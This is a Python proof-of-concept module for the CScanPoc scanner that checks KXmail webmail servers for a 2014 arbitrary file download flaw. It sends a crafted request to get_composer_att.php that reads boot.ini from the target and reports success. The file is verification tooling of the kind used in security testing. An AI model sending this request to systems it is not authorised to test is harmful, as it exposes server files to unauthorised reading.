# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'KXmail_0001'  # 平台漏洞编号，留空
    name = '科信邮件系统 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-07-01'  # 漏洞公布时间
    desc = '''
        科信邮件系统 任意文件下载漏洞导致敏感信息泄漏，可致系统沦陷。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=66892'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'KXmail'  # 漏洞应用名称
    product_version = 'KXmail'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '52608763-742c-4987-91c0-e1446d8d86e9'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # ref http://www.wooyun.org/bugs/wooyun-2014-066892
            verify_url = ('%s/prog/get_composer_att.php?att_size=1623&filenamepath'
                          '=~/boot.ini&maxatt_sign=4bc882e8c4a98ac7a97acd321aad4f'
                          '88&attach_filename=boot.ini') % self.target

            req = requests.get(verify_url)
            if req.status_code == 200 and 'boot.ini' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
